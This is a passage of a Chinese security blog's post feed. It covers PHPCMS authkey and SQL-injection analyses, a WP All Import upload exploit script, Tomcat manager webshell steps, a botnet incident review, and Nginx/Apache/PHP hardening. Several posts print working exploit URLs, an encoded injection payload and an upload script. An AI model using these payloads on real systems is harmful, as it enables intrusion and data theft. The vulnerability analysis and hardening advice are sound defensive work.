这样就可以拦截http流量，但是大部分的流量是https的还需要倒入证书，使用手机的浏览器访问你的代理ip＋端口，可以看到burpsutie的界面，点击CA Certificate证书，可以把证书下载，然后倒入手机中即可 这样可以看到流量http和https都经过你的电脑了，就可以像测试web一样进行抓包测试了。 以上是最简单的抓包配置。从这基本上就可以开始进行简单的测试，新世界的大门就打开了。 ","link":"https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-1/"},{"title":"PHPCMS Authkey 泄露漏洞分析","content":"PHPCMS V9 Authkey泄露漏洞 在PHPCMS V9的版本中（现已修复） phpcms/phpsso\\_server/phpcms/modules/phpsso/index.php 中有一段代码如下： /** * 获取应用列表 */ public function getapplist() { $applist = getcache('applist', 'admin'); exit(serialize($applist)); } 此处可以获取cache_admin的信息，内容如下： 可以获得authkey和调用它的文件api.php 获得cache的URL是通过上传用户头像处可以解出来： http://localhost:8038/study/phpcms/phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=uploadavatar&amp;auth_data=v=1&amp;appid=1&amp;data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9%2BDjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQA 将其中的uploadavatar替换成getapplist即可获取cache信息。 拿到authkey之后，就可以利用他编码请求从而达到执行特定操作的目的。 通过cache_admin可以看出来在api.php?op=phpsso处调用了authkey。我们直接定位到该处。使用authkey加密payload。 http://localhost/api.php?op=phpsso&amp;code=6f56BQgIUVQDVAkGUwEFCgwDAwNSAVBdA1UHD1RSURFZDlgIS0EPCFwDUFhFFl1dCBMWVlkHE0xDUFJDBktfCRhQGlZXVgIFR0weSERPQUpQRh4eHk8CEBA 加密的语句是：action=synlogin&amp;uid=' and updatexml(1,concat('~',user()),1)# 执行完后的结果： 修复 升级PHPCMS版本 删除cache文件 修改默认的authkey ","link":"https://brick713.github.io/phpcms-authkey-xie-lu-lou-dong-fen-xi/"},{"title":"Nginx安全性能配置&&DDOS防范","content":" 最近看了一些Nginx的配置的文章主要和性能有关，包括一些安全上的配置，并不对所有设备适用，总结下来觉得有用的可以自取，另外是加深自己对服务器的理解。其中有一些有关DDOS的配置。内容参考了两篇文章和自己的一些安全理解。文章地址如下： Tuning NGINX for Performance Mitigating DDoS Attacks with NGINX and NGINX Plus Nginx 配置优化 基本配置路径一般在/etc/nginx/nginx.conf,如果站点配置文件不是nginx.conf，而是独立的站点配置文件，那就到相应的站点去修改配置。 worker_processes auto 该选项控制Nginx运行时候的工作进程个数，默认值为1。调节为auto worker_connections 表示工作进程能处理的最大连接数。默认为512，可调节为更高，我自己设置为1000。主要看服务器的硬件配置及流量特性。 keepalive_requests 表示客户端单个连接上最多能发送多少个请求，默认值是100。可以设置成更高的值，试情况而定。 keepalive_timeout指定每个连接最多保持多长的打开状态，为了防止DDOS攻击，可以改为60或者更小。视情况而定。 server_tokens 该选项可以隐藏Nginx的版本号，关闭他可以防止攻击者嗅探到Nginx版本从而做相关渗透。 worker_rlimit_nofile 进程最大打开文件数 可以配置为一个较高的数字。避免出现『too many open files』 proxy_hide_header X-Powered-By; 该指令可以隐藏一些header的信息。通常x-powered-by会泄露网站相关信息我们需要将其隐藏。 host header attack攻击修复 在server模块中添加： # Only requests to our Host are allowed if ($host !~ ^($server_name)$ ) { return 444; } Nginx DDOS 防御配置优化 现在的DDOS基于应用层的比较多，比如CC攻击。通常有如下特点： 攻击的IP或IP段相对固定，每个IP都有远大于真实用户的连接数和请求数。 因为攻击是由木马发出且目的是使服务器超负荷，请求的频率会远远超过正常人的请求。 User-Agent通常是一个非标准的值 Referer有时是一个容易联想到攻击的值 根据以上的相关特征可以做以下配置来抵抗DDOS攻击 限制请求速度 limit_req_zone $binary_remote_addr zone=one:10m rate=2/s; 限制连接数量 limit_conn_zone $binary_remote_addr zone=addr:10m; 关闭慢连接 在server中添加 server { client_body_timeout 5s; client_header_timeout 5s; } 设置IP黑/白名单 使用缓存进行流量削峰 屏蔽特定请求 针对特定URL的请求 针对不是常见的User-Agent的请求 针对Referer头中包含可以联想到攻击的值的请求 针对其他请求头中包含可以联想到攻击的值的请求 比如，如果你判定攻击是针对一个特定的URL：/foo.php，攻击请求的User-Agent中包含foo或bar 我们就可以屏蔽到这个页面的请求： location /foo.php { deny all; } location /{ if ($http_user_agent ~* foo|bar) { return 403; } } 总结 Nginx和Nginx Plus可以作为抵御DDOS攻击的一个有力手段，而且Nginx Plus中提供了一些附加的特性来更好的抵御DDOS攻击并且当攻击发生时及时的识别到。 ","link":"https://brick713.github.io/nginx-an-quan-xing-neng-pei-zhi-andddos-fang-fan/"},{"title":"Linux/BillGates僵尸网络分析","content":" 0x00起因 前阵子在用户某台设备上检测到一个IP在向外大量的发送SSH链接请求，而且有大量的DDOS其他IP的嫌疑。很明显这个IP的机器已经被人黑了，自然需要检测原因。于是就一步步开始排查。 0x01检查 先通过Tcpdump抓了下机器的包。发现在大量的SSH包中，还存在比较大的TCP的包，而这些包都指向一个IP 183.56.173.197，把这部分包都抓下来分析下。包里内容如下： 这个是个比较明显的和僵尸主机的CNC回传通信，应该是确认僵尸存活使用的。 顺便查了下这个IP 183.56.173.197，就是一个恶意的主机节点。而且应该还是个存活的节点。 查询了一下，发现这个主机节点控制一种叫Linux/BillGates.Lite僵尸网络。这种僵尸网络主要是被用来进行DDOS攻击，同样会窃取服务的文件发送给僵尸主机。当僵尸存在的时候会在机器的**/tmp/路径下生产一个标志性文件gates.lod**，于是我去路径下很快就发现了这个文件。 到此基本上就确认了是Linux/BillGates影响了该机器。 0x02 溯源 既然机器被人黑了，总要查下攻击者怎么进来的。 使用last命令看一下近期的登陆情况。发现了端倪： 这两个IP是外网IP而且非常搞笑的是他们的地址完全和机器无关 进来的时间也非常可疑，凌晨2点上下。很明显就是攻击者啦。至于怎么进来的，从这看应该是通过SSH暴力破解进入的机器。这个Oracle账号的密码应该是过于简单了。 既然已经定位到账号了。看看他在这个时间段都干嘛了。进入用户目录/home/oracle/，查看.bash_history文件： 一目了然，攻击者进来之后，先进入了**/tmp**目录，然后去僵尸主机上下载了一个可执行文件，加权后执行然后退出该账号。 这个可执行文件最后没有找到。细想一下应该是执行完后自删除了，不留痕迹。 最后生成的恶意文件gates.lod，权限账户就是为oracle。 0x03 结论 攻击者进来的方式很简单，SSH暴力破解，完成破解之后，去主机上下载可执行文件，执行后加载了僵尸病毒，最后完成自删除行为，被植入僵尸的主机会干3件事： 继续进行SSH暴力破解获得更多僵尸 进行DDOS攻击其它机器 定期回传信息给控制机 完成整个攻击，共出现了一共3个IP，这三个IP分工明确，第一个IP 182.151.213.178负责进行暴力破解，第二个IP 1.82.191.37负责连接至被暴力破解主机进行相关恶意操作，第三个IP 183.56.173.197是僵尸的控制机，负责控制僵尸。很明显前两个IP应该也是受害者。 0x04 尾巴 这台机器从这次事件来看有如下弱点需要改进： 账户密码强度太低，需要增强 应该禁止外网IP进行SSH连接，或者修改连接端口。 tmp目录有执行权限，最好修改tmp目录权限 总之完成这次流程也花了一些时间，总结下来给自己留做经验吧。 最后附上个连接，是详细分析Linux/BillGates的有兴趣的可以看看 MMD-0039-2015 - ChinaZ made new malware: ELF Linux/BillGates.Lite ","link":"https://brick713.github.io/linuxbillgates-jiang-shi-wang-luo-fen-xi/"},{"title":"Wordpress WP All Import插件漏洞分析","content":" 0x00 插件 Wordpress WP All Import 3.2.3 (Pro 4.0.3)插件主要功能是支持用户上传XML和CSV文件。一般这种支持上传功能的插件最最最危险的地方就是不做文件格式检测，或者是检测方法过弱易被绕过。 该插件上传的文件可以通过 http://&quot;+site+&quot;/wp-content/uploads/wpallimport/uploads/&quot;+up_dir+&quot;/ 路径访问。 0x01 利用 非常简单的利用方法： 一个PHP木马（小马） 找到上传插件的位置 上传恶意文件 访问小马，上传Shell 详细漏洞介绍： 因为该插件版本已经更新了，有问题的版本已经没法下载了。只能看别人的具体分析了。 WordPress WP All 3.2.3 Shell Upload 0X02 检测 写个简单的脚本就可以测试漏洞了 import requests,os site=&quot;&quot; file_to_upload ='' up_req = requests.post('http://'+site+'/wp-admin/admin-ajax.php?page=pmxi-admin-settings&amp;action=upload&amp;name=evil.php',data=open(file_to_upload,'rb').read()) up_dir = os.popen('php -r &quot;print md5(strtotime(\\''+up_req.headers['date']+'\\'));&quot;').read() print &quot;http://&quot;+site+&quot;/wp-content/uploads/wpallimport/uploads/&quot;+up_dir+&quot;/%s&quot; % （file_to_upload） site处填域名，file_to_upload处填上传的文件名。 0x03 反思 很多网站都具备上传功能，支持的格式也多种多样。针对上传漏洞，解决方法个人觉得可以有以下方法： 把文件上传到root目录以外的目录里（严格控制目录权限，文件权限。 禁止覆盖已存在的文件 严格验证文件格式 随机生成上传文件名 必要情况下增加上传白名单（功能只开放给某些用户）。 ","link":"https://brick713.github.io/wordpress-wp-all-import-cha-jian-lou-dong-fen-xi/"},{"title":"Tomcat Manager 后台漏洞分析","content":"0x00 起源 之前分析某设备被入侵，一直没查出来攻击者是怎么黑掉设备的，于是对着设备一通分析。结果发现了另外一条黑进去的方法。。。当然最好是弄清楚了实际原因，附带给把这个意外的漏洞给修了，回去研究发现原因很简单。 顺带一提，漏洞形成的原因虽然是Tomcat本身的原因，但是开发公司各种糟糕的配置是把该问题放大的帮凶。 tomcat是一个开源Web服务器，基于Tomcat的Web运行效率高，可以在一般的硬件平台上流畅运行，因此，颇受Web站长的青睐。不过，在默认配置下其存在一定的安全隐患，可被恶意攻击。 0x01 问题起源 Tomcat是一个开源Web服务器，基于Tomcat的Web运行效率高，最方便的是没有复杂的安全，解压文件就能使用，不过因为Tomcat实在太火了，被人研究的也很透彻。 Tomcat的默认后台地址为:http://域名:端口/manager/html. 进入之后弹出登陆对话框,Tomcat默认的用户名admin,密码为空。原因很简单，默认的配置是没有给他配置密码的，当然如果碰上密码不正确，可以试试弱口令。 获取Webshell 在管理界面有很多信息可以查看，包括Linux版本，Tomcat版本，相关路径等等 管理界面有个模块，可以上传WAR文件。Tomcat可以解析WAR文件，能够将其解压并生成web文件。 如果将一个jsp格式的webshell打包然后改名为WAR，将其上传到服务器， 然后在上传路径上打开jsp木马，这样就获得了一个Webshell。 获取设备root权限 Tomcat服务默认是以system权限运行的，因此该jsp木马就继承了其权限，然后可以干什么事我就不说了。 0x02 漏洞防范 修改\\conf\\tomacat-users.xml 把默认密码修改为强密码。 关闭或者删除Tomcat后台 \\webapps全部删除就好（简单暴力）。 服务降权，限制Tomcat的权限。 0x03 尾巴 该漏洞主要是几个连环的问题引起的： Tomcat后台 弱密码 支持文件上传 权限不当 不光是Tomcat，所有的服务器都得注意以上的一些安全问题。 ","link":"https://brick713.github.io/tomcat-manager-hou-tai-lou-dong-fen-xi/"},{"title":"PHPCMS V9 SQL注入漏洞","content":"0x00 漏洞描述 在PHPCMS V9版本（最新版本）的登录功能中，存在SQL注入漏洞，登录界面通过POST传入的data内容，解析其中的内容会作为注册、登陆、删除用户等操作的内容依据，而这些操作都会将这些数据作为数据库查询语句使用。因为代码没有做过滤，攻击者可以利用POST内容进行SQL注入。 0x01 漏洞成因 总结来说漏洞的成因主要是以下两点： 1.POST内容用来进行数据库查询 2.5.3版本之后的PHP配置默认关闭GPC gpc 是PHP的一个防止SQL注入的转义机制。所有的全局变量会被php的函数mysql magic_quotes_gpc进行编码，把一些特殊字符例如‘，“，,NULL等等，加上反斜线\\，从而避免sql注入.在PHP的配置中可以开启该功能。 0x02 漏洞代码分析 下面通过PHPCMS的源码来分析在文件中漏洞成因。 \\phpcms\\modules\\member\\index.php $username = isset($_POST['username']) &amp;&amp; is_username($_POST['username']) ? trim($_POST['username']) : showmessage(L('username_empty'), HTTP_REFERER); $password = isset($_POST['password']) &amp;&amp; trim($_POST['password']) ? trim($_POST['password']) : showmessage(L('password_empty'), HTTP_REFERER); $cookietime = intval($_POST['cookietime']); $synloginstr = ''; //同步登陆js代码 if(pc_base::load_config('system', 'phpsso')) { $this-&gt;_init_phpsso(); //通过client的ps_member_login方法传入$username、$password获取一段数据 $status = $this-&gt;client-&gt;ps_member_login($username, $password); $memberinfo = unserialize($status); 注意这段PHP代码中，username使用的is_username进行了过滤而password没有做任何处理。 is_username(）这个函数的功能是检查用户名是否符合规定，是PHPCMS中的一个检查机制。具体代码如下： /** * 检查用户名是否符合规定 * * @param STRING $username 要检查的用户名 * @return TRUE or FALSE */ function is_username($username) { $strlen = strlen($username); if(is_badword($username) || !preg_match(&quot;/^[a-zA-Z0-9_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]+$/&quot;, $username)){ return false; } elseif ( 20 &lt; $strlen || $strlen &lt; 2 ) { return false; } return true; } Login对变量进行了处理之后将变量创给了ps_member_login函数 继续跟进ps_member_login和_ps_send函数 /** * 用户登陆 * @param string $username 用户名 * @param string $password 密码 * @param int $isemail email * @return int {-2;密码错误;-1:用户名不存在;array(userinfo):用户信息} */ public function ps_member_login($username, $password, $isemail=0) { if($isemail) { if(!$this-&gt;_is_email($username)) { return -3; } $return = $this-&gt;_ps_send('login', array('email'=&gt;$username, 'password'=&gt;$password)); } else { $return = $this-&gt;_ps_send('login', array('username'=&gt;$username, 'password'=&gt;$password)); } return $return; } private function _ps_send($action, $data = null) { return $this-&gt;_ps_post($this-&gt;ps_api_url.&quot;/index.php?m=phpsso&amp;c=index&amp;a=&quot;.$action, 500000, $this-&gt;auth_data($data)); } 通过ps_member_login方法获取一段数据之后，再由_ps_send向phpsso发送http包的post数据，phpsso认证完成后，将用户的信息返回给member的login送入数据库进行查询处理。 这里基本上还原了PHPCMS对数据的处理，总结下基本流程： 登录用户提交用户名和密码给menber的login 然后member的login通过ps_member_login构造发送phpsso请求login验证的http包，并且将用户名和密码作为post数据. phpsso认证完成后，将用户的信息返回给member的login进行后续处理 在整个认证过程中，password没有做任何处理就直接传入phpsso，phpsso没有对于解码数据进行过滤。 0x03 攻击方法 编码绕过 password字段如果存在特殊字符，在传入到程序时仍然会被转义，针对这个问题可以使用二次url编码的方法来搞定。所以，我们只需要在传password内容时传递%2527就可以让单引号出现在phpsso的变量中了。 数据查询 在phpsso的login中使用的是username做数据库查询，而不是passwod。而username是经过处理的，因此我们需要想法构造password让他具有查询的能力。 这里需要看PHPCMS是如何处理URL中的POST变量的。 if(isset($_POST['data'])) { parse_str(sys_auth($_POST['data'], 'DECODE', $this-&gt;applist[$this-&gt;appid]['authkey']), $this-&gt;data); if(empty($this-&gt;data) || !is_array($this-&gt;data)) { exit('0'); } } else { exit('0'); } 这里POST数据使用了parse_str函数进行处理。它的功能是解析出POST数据中的变量值。 例如： &lt;?php parse_str(&quot;id=23&amp;name=John%20Adams&quot;); echo $id.&quot;&lt;br /&gt;&quot;; echo $name; ?&gt; 输出： 23 John Adams 当我们的数据为“username=123&amp;password=456”这样的字符串，会把它解析为： Array( username=&gt;123, password=&gt;456 ) 但是这个函数存在解析问题，如果我们构造字符串成“usernamen=123&amp;password=456&amp;username=789”，他就会被解析为： Array( username=&gt;789, password=&gt;456 } 那这样我们的利用思路就有了：将”&amp;username=”进行url编码后作为password的值用于在phpsso中覆盖之前的username值，在“&amp;username=”后面添加进行两次url编码的SQL语句，构造出来的POST数据如下： usernmae=phpcms&amp;password=%26username%3d%2527 通过这样的方法，我们绕过了username的检测，利用password提交了注入数据，现在我们来提交一段复杂的代码： username=phpcms&amp;password=123456&amp;username=' union select '2','test\\',updatexml(1,concat(0x5e24,(select user()),0x5e24),1),\\'123456\\',\\'\\',\\'\\',\\'\\',\\'\\',\\'\\',\\'2\\',\\'10\\'),(\\'2\\',\\'test','5f1d7a84db00d2fce00b31a7fc73224f','123456',null,null,null,null,null,null,null,null,null# 经过编码后变成： username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523 0x04 防御方法 添加过滤代码，最好的方式应该是将转义和过滤放在数据库操作的前一步，这样可以极有效缓解SQL注入带来的问题。 \\phpcms\\modules\\member\\index.php $username = isset($_POST['username']) &amp;&amp; is_username($_POST['username']) ? trim($_POST['username']) : showmessage(L('username_empty'), HTTP_REFERER); //$password = isset($_POST['password']) &amp;&amp; trim($_POST['password']) ? trim($_POST['password']) : showmessage(L('password_empty'), HTTP_REFERER); /* 过滤、转义 */ $password = isset($_POST['password']) &amp;&amp; trim($_POST['password']) ? addslashes(urldecode(trim($_POST['password']))) : showmessage(L('password_empty'), HTTP_REFERER); /**/ 0x05 另一种玩法 如果能拿到auth_key的话可以通过auth_key进行注入，具体方法请参考： PHPCMS V9 一个为所欲为的漏洞 尾巴 这个洞利用不太方便，官方已经修复了漏洞，而且必须是PHP5.3才能利用。 ","link":"https://brick713.github.io/phpcms-v9-sql-zhu-ru-lou-dong/"},{"title":"安全工具收集","content":"最近做一些安全风险控制的测试，所以收集了大部分能想到找到的工具，做了一些分类，主要记录了一些工具的分类，功能以及简单介绍。方便进行查询，所有工具的介绍皆来自网络上的描述，我这只是做了个梳理收集。 公司穷啊，基本上只能用开源或者破解的软件，我自己也就是个『脚本小子』的等级。 测评工具分类 (一)安全测试工具 1. 脆弱性扫描工具 脆弱性扫描工具又称安全扫描器或漏洞扫描仪，是目前应用比较广泛的安全测试工具之一，主要用于识别网络、操作系统、数据库、应用的脆弱性，给出修补建议。 1)基于网络的扫描工具：通过网络实现扫描，可以看作是一钟漏洞信息收集工具，根据不同漏洞的特征，构造网络数据包，发给网络中的一个或多个目标，以判断某个特定的漏洞是否存在，能够检测防火墙、IDS等网络层设备的错误配置或者链接到网络中的网络服务器的关键漏洞。 常用工具： 天镜脆弱性扫描与管理系统 极光远程安全评估系统 榕基网络隐患扫描系统 Nessus Nmap 2)基于主机的扫描工具：通常在目标系统上安装一个代理（Agent)或者是服务（Services),以便能够访问所有的主机文件与进程，这也使得基于主机的漏洞扫描器能够扫描更多系统层面的漏洞。 常用工具： 微软基线安全分析器 日志分析工具 木马查杀工具 3)数据库安全扫描工具：通过授权或非授权模式，自动、深入地识别数据库系统中存在的多种安全隐患，包括数据库的鉴别、授权、认证、配置等一系列安全问题，也可识别数据库系统中潜在的弱点，并依据内置的知识库对违背和不遵循数据库安全性策略的做法推荐修正措施。 常用工具： 安信通数据库安全扫描工具 明鉴数据库弱点扫描器 还有oscanner Mysqlweak 4)Web应用安全扫描工具：通过构造多种形式的Web访问请求，远程访问目标应用特定端口的服务，记录反馈信息，并与内置的漏洞库进行匹配，判断确认Web应用程序中的安全缺陷，确认Web应用程序遭受恶意攻击的危险。 常用工具： AppScan WebRavor WebInspect Acunetix Web Vulnerability Scanner N-Stealth 2. 渗透测试工具 渗透测试需要以脆弱性扫描工具扫描的结果为基础信息，结合专用的渗透测试工具开展模拟探测和入侵，判断被非法访问者利用的可能性，从而进一步判断已知的脆弱性是否真正会给系统或网络带来影响。 常用工具： 流光（Fluxay) Pangolin Canvas SQLMap SQLIer SQL Power Injector SQLNinja 3. 静态分析工具 静态程序分析是指使用自动化或半自动化工具软件对程序源代码进行检查，以分析程序行为的技术，广泛应用于程序的正确性检查、安全缺陷检测、程序优化等。 常用工具： FortifySCA Checkmark CxSuite IBM Rational AppScan Source Edition PC-Lint KlocWork公司的K7 (二)测评辅助工具 测评辅助工具主要实现对原始数据的采集、现状分析和趋势分析等单项功能，其输出结果可作为了解被测系统某方面特性或现状、进一步开展相关安全测试的输入，也可以直接作为系统安全评估的技术依据。 1. 性能测试工具 性能测试工具是通过自动化手段模拟多种正常、峰值以及异常负载条件来对系统或网络 负载、强度或容量等各项性能指标进行测试的工具。性能测试可分为应用在客户端性能的测试、应用在网络上性能的测试和应用在服务器端性能的测试。 常用工具：IXIA、Avalanche/Refector、BreakingPoint Systems、SamrtBits、LoadRunner等。 2、协议分析工具 协议分析工具是指分析网络数据包、了解信息和相关的数据包在产生和传输过程中的行为工具。此类工具既能用于合法网络管理也能用于窃取网络信息。 常用工具： Radcom Sniffer Pro Wireshark 3. 物理环境检测工具 是指对放置信息系统主要设备（服务器、网络设备、数据存储器等)的场所的物理特性进行检测所需的工具。 4. 网络拓扑生产工具 是通过接入点接入被测评网络，自动完成被测评网络中资产的发现和统计功能，并提供网络资产的相关信息，包括网络硬件设备的识别、操作系统版本、型号，同时自动生成拓扑结构图等。 常见工具： HPOpenView 5. 安全配置检测工具 是按照一定的安全基线或基准安全标准，形成完整的安全配置内置知识库，实现对设备或软件安全配置的快速、有效、集中搜集，并识别与安全基线不符合的项目，形成核查报告，为进一步实施安全评估提供数据来源。 常见工具： 绿盟安全配置核查系统（NSFOCUS Benchamark Verification System,简称：NSFOCUS BVS) 安码科技安全配置检查系统 (三)测评管理工具 测评管理工具主要用于规范测评过程和操作方法，或者用于收集测评所需的数据和资料，并根据测评知识库和推理专家库知识库辅助测评人员进行测评结果判断。 常用测评工具 1. 脆弱性扫描工具 天镜脆弱性扫描与管理系统是基于网络的脆弱性分析、评估和综合管理系统，启明星辰通过总结多年的市场经验和客户需求，提出了“发现－扫描－定性－修复－审核” 弱点全面评估法则，能够快速发现网络资产，准确识别资产属性、全面扫描安全漏洞，清晰定性安全风险，给出修复建议和预防措施，并对风险控制策略进行有效审核，从而在弱点全面评估的基础上实现安全自主掌控。 2)极光远程安全评估系统依托专业的NSFOCUS安全小组，综合运用了NSIP等多种领先技术，会自动、高效、及时、准确地发现网络资产存在的安全漏洞；尤其是可以对发现的网络资产的安全漏洞进行详细分析，并采用权威的风险评估模型将风险量化，给出专业的解决方案；最值得关注的是它可以提供Open VM（开放漏洞管理)工作流程平台，将先进的漏洞管理理念贯穿于整个产品实现过程之中。 3)Nessus是一款可以运行在Linux、BSD、Solaris以及其他一些系统上的远程安全扫描软件。它是多线程、基于插入式的软件，拥有很好的GTK界面，能够完成超过1200项的远程安全检查，具有强大的报告输出能力，可以产生HTML、XML、LaTeX和ASCII文本等格式的安全报告，并且会为每一个发现的安全问题提出解决建议。 4)Nmap最早于1997年9月推出，支持Linux、Windows、Solaris、BSD、Mac OS X、AmigaOS系统，采用GPL许可证，最初用于扫描开发网络连接端，确定哪些服务运行在哪些连接端，它是评估网络系统安全的重要软件，也是黑客常用的工具之一。 5)微软基线安全分析器（Microsoft Baseline Security Analyzer,MBSA)是微软公司开发的安全分析软件，运行Windows系列操作系统上，可通过图形和命令行界面对本地或远程Windows类操作系统进行安全性分析，并坚持已安装的其他组件（如：Internet Information Services（IIS)和SQL Server)，发现缺少的修补程序和存在安全漏洞；帮助用户根据Microsoft的安全建议确定其安全状态，并根据状态提供具体的修正指导。 6)明鉴WEB应用弱点扫描器具有精确的“取证式”扫描功能、强大的安全审计、渗透测试功能、误报率和漏报率等各项关键指标均表现不俗。MatriXay 5.0 (2011版) 全面支持OWASP TOP 10检测，可以帮助用户充分了解WEB应用存在的安全隐患，建立安全可靠的WEB应用服务，改善并提升应用系统抗各类WEB应用攻击的能力（如：注入攻击、跨站脚本、钓鱼攻击、信息泄露、恶意编码、表单绕过、缓冲区溢出等)，协助用户满足等级保护、PCI、内控审计等相关工作。 7)安信通数据库漏洞扫描系统Database Security Scan System（简称AXT-DB)支持授权检测和非授权检测两种模式，非授权检测依据数据库版本号按照选定的非授权检测策略对目标数据库进行检测，授权检测使用具有DBA权限的数据库帐户，按照选定的授权检测策略对目标数据库进行漏洞检测，并支持默认口令检测、sql注入、缓冲区溢出等专项检测；能够检测到扫描口令过于简单、权限控制、系统配置等一系列问题，能够发现Oracle、MS-SQL Server、Sybase、MySQL、DB2等主流数据库系统中存在的安全隐患，内置的知识库能够对违背和不遵循安全性策略的做法推荐修正的操作，并提供简单明了的综合报告和详细报告。 8)AppSan Standard Edition（简称Appscan)是一个产品家族，包括IBM众多的应用安全扫描产品，从开发阶段的源代码扫描的AppSan Source Edition，到针对Web应用进行快速扫描的AppSan Standard Edition，以及进行安全管理和汇总整合的AppSan Enterprise Edition等，能够在Web开发、测试、维护、运营的整个生命周期中，帮助用户高新的发现、解决安全漏洞。 9)WebInspect是惠普公司的一款应用安全测试工具，该软件建立在Web 2.0技术基础上，利用创新的动态安全分析技术及评估技术检查Web服务及Web应用程序的安全，惠普WebInspect提供快速扫描功能，以及准确的Web应用程序安全扫描结果；支持JavaScript，Flash，Silverlight等客户端脚本代码静态分析。 10)WebRavor来自北京域安领创公司，是国内顶尖团队开发的一款Web应用安全评估产品。该产品是目前业界强悍的专注于Web应用安全弱点的评估工具，能应对各种复杂的Web应用（Web、ERP、SSL等)，全面深入发现里面存在的安全弱点；扫描策略精确针对各个数据库系统的特点，结果准确性高，误报率较低，能够支持绝大多数的主流数据库，包括：Oracle、DB2、Sybase、Informix、Microsoft SQL Server、Access和MySQL，根据不同数据库的特点进行有针对性的漏洞分析；不仅可以全自动地进行主动模式扫描，还可以在用户的干预下进行被动模式的扫描，以便对一些复杂表格和应用进行全面检测；支持SSL扫描；支持对策略的扩展，用户可以根据需要自行制定或者开发新的审计策略，包含了灵活的渗透测试模块，可根据需要定制渗透测试方法，对扫描发现的问题进一步验证。 2. 渗透测试工具 1)流光（Fluxay)一款功能强大的ftp、pop3解密工具，用于检测POP3/FTP主机中用户密码安全漏洞。Fluxay采用多线程检测、高效服务器流模式，可同时对多台POP3/FTP主机进行检测，最多500个线程探测，支持10个字典同时检测。 2)Canvas是一款商业的安全漏洞检测工具，Canvas为渗透测试人员开发了大量的漏洞程序，还包含一个自动化的漏洞利用系统，以及一个综合性的、可靠的漏洞部署框架；内置了150个以上的漏洞利用。 3)Pangolin是一款帮助渗透测试人员进行SQL注入测试的工具。Pangolin能够通过一系列非常简单的操作，达到最大化的攻击测试效果。它从检测注入开始到最后控制目标系统都给出了测试步骤。过去有许多Sql注入工具，不过有些功能不完全，支持的数据库不够多，或者是速度比较慢。但是，在Pangolin发布以后，这些问题都完满的解决。 尾巴 基本上想到的就是这么多，其实Kali Linux上面集成了大部分工具，新出的2.0重新更新了工具。我这也就是个拾遗的过程，主要就是总结。 ","link":"https://brick713.github.io/an-quan-gong-ju-shou-ji/"},{"title":"服务器安全配置指南","content":"安全配置小记 最近接触到要配置服务器安全，所有上网查了一堆关于服务器配置的内容，收益最大的还是Wooyun的两篇关于Nginx和Apache的安全配置的文章，这里综合自己的查找的内容作了一点总结，方便自己以后配置服务器。 下面就讲述下一些相关的安全配置。 规范和对象 针对的主要是以下一些配置： 1.Apache 2.Nginx 3.PHP 4.OpenSSL 因为每台机器的功能和需求不同，所有配置需根据实际情况进行修改，如果影响设备基本功能可以酌情考虑不修改配置。 配置方法 下面讲一些配置方法，有些不详细列举。 Apache apache的一些配置主要是通过httpd.conf来实现的，通过修改httpd.conf文件来更改配置。 版本更新 查看apache版本号：httpd –v ，一般情况下，如果版本过低，那么理论上存在的漏洞也更多。 信息隐藏 服务的一些信息是可以给攻击者提供大量的参考信息，因此适当的隐藏这些内容，能帮助保护服务器的安全。 1.隐藏Apache信息 ServerTokens OS 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称） ServerSignature On 修改为：ServerSignature Off（不回显apache版本信息） 2.改变端口信息 配置httpd.conf修改修改监听端口来防止一些内部系统被扫描 这样可以防止一些直接扫描80端口的攻击者 Listen 12345（任意） 禁用项目 1.禁用Autoindex模块 Autoindex是Apache的模块，当目录中没有index文件的时候能自动生成和输出目录清单，类似于ls命令。该模块会产生目录遍历问题。 把&quot;LoadModule autoindex_module modules/mod_autoindex.so&quot;一行前面加上#禁止掉。 2.禁用目录浏览 将Options Indexes FollowSymLinks改为Options -Indexes FollowSymLinks 3.禁用权限 配置httpd.conf取消对上传目录的PHP执行权限 &lt;Directory &quot;/var/www/html/aaa（限制目录）&quot;&gt; &lt;FilesMatch &quot;.(php|php5)$&quot;&gt; Deny from all &lt;/FilesMatch&gt; &lt;/Directory&gt; 4.禁止访问文件夹 配置httpd.conf限制禁止访问的文件夹，例如后台目录 &lt;Directory &quot;/var/www/html/aaa（限制目录）&quot;&gt; Deny from all &lt;/Directory&gt; 5.禁止访问IP（可选） 配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。 &lt;Directory &quot;/var/www/html/aaa&quot;&gt; Order Deny,Allow Deny from all Allow from 192.168.1.111 &lt;/Directory&gt; 6.禁止文件访问类型（可选） 配置httpd.conf限制一些文件类型的访问，如txt的日志 &lt;Files ~ &quot;.txt$&quot;&gt; Order allow,deny Deny from all &lt;/Files&gt;' 7.禁止对.htaccess的支持 将 AllowOverride All 改为 AllowOverride None PHP 隐藏信息 1.隐藏版本信息 修改/etc/php.ini expose_php 为off 2.隐藏错误信息 display_errors = Off //禁止爆出错误 3.隐藏启动错误信息 display_startup_errors =Off 禁用项目： 1.禁用高危函数（开启安全模式后无需配置） disable_functions = phpinfo, get_cfg_var //禁止phpinfo和get_cfg_var等函数 2.禁用远程内容获取 allow_url_fopen = Off //这个关闭，就没有办法取远程内容了 allow_url_include=Off 安全配置 1.安全模式 safe_mode = On //开启安全模式 safe_mode_gid = off // 2.控制可访问文件（可选） open_basedir = /usr/www（网站文件路径） 3.关闭注册全局变量 register_globals = Off 4.防止SQL注入 magic_quotes_gpc = on 5.Http-only开启 session.cookie_httponly = 1 6.配置打印错误内容 error_reporting = E_ALL&amp; ~E_NOTICE OpenSSL： 